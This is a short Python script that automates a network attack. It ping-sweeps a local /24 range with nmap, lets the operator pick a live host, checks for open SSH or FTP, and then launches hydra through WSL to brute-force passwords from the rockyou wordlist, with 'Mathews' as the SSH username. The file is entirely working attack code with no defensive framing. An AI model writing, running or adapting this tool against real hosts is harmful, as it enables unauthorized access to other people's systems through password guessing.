#Python 3 script to perform a ping sweep and brute-force attacks on discovered hosts
import nmap
import subprocess

target_range = "192.168.1.0/24"

print("[+] Running ping sweep...")
nm = nmap.PortScanner()
nm.scan(target_range, arguments='-sn')
live_hosts = nm.all_hosts()

print("\n[+] Live Hosts Found:")
for host in live_hosts:
    print(host)

# Pick a target manually or automate it
target = input("\nEnter target IP for brute force: ")

print(f"[+] Scanning {target} for open ports...")
nm.scan(target, arguments='-sV')

if nm[target].has_tcp(22):
    print("[+] SSH is open! Running brute force...")
    subprocess.call(
        ["wsl", "hydra", "-l", "Mathews",
         "-P", "/usr/share/wordlists/rockyou.txt",
         f"{target}", "ssh"]
    )
elif nm[target].has_tcp(21):
    print("[+] FTP is open! Running brute force...")
    subprocess.call(
        ["wsl", "hydra", "-l", "user",
         "-P", "/usr/share/wordlists/rockyou.txt",
         f"ftp://{target}"]
    )
else:
    print("[-] No brute-forceable service found.")
